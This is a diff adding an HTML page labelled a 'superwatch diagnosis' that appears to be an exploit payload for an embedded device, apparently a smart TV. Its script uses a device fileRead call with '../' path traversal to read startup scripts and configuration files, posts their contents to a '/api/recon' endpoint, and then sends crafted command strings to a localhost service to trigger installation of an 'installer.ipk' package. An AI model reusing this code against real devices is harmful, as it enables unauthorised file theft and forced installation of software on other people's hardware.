@@ -1,0 +1,58 @@
+<!doctype html>
+<!-- superwatch diagnosis: paced fileReads of the starter script + a sw2
+     command battery (dir-size + install format variants). -->
+<html><head><meta charset="utf-8"><title>sw-diag</title></head>
+<body><pre id="out">running…</pre><script>
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  var report = { started: new Date().toISOString(), files: {}, sw2: null };
+  function save(tag) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
+    } catch (e) {}
+  }
+  function raw(path) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
+      var msg = r.msg;
+      if (msg != null && typeof msg === "object") msg = JSON.stringify(msg);
+      return { ret: r.ret, msg: String(msg == null ? "" : msg).slice(0, 7000) };
+    } catch (e) { return { exception: String(e) }; }
+  }
+  var T = ["../usr/local/scripts/start-superwatch.sh",
+           "../usr/local/etc/superwatch.conf",
+           "../usr/local/etc/superwatch/config.json"];
+  var i = 0;
+  function readPhase() {
+    if (i >= T.length) { setTimeout(battery, 1500); return; }
+    report.files["f" + i] = raw(T[i]);
+    save("diag-" + i);
+    i++;
+    setTimeout(readPhase, 2500);
+  }
+  function trigger(list) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "https://localhost:9888/function/basic/fetch/sw2", false);
+      x.setRequestHeader("identifier", "");
+      x.send(JSON.stringify({ list: list }));
+      return String(x.responseText || "");
+    } catch (e) { return "EXC " + e.name + ": " + e.message; }
+  }
+  function battery() {
+    report.sw2 = trigger([
+      "90:85:90;/APPS/installer.ipk;re.installer;",
+      "91:82:91;/APPS/installer.ipk;re.installer",
+      "92:82:92;/APPS/installer.ipk;re.installer; ",
+      "93:84:93;re.installer"
+    ]);
+    save("diag-battery");
+    try { out.textContent = JSON.stringify(report, null, 1); } catch (e) {}
+  }
+  readPhase();
+})();
+</script></body></html>
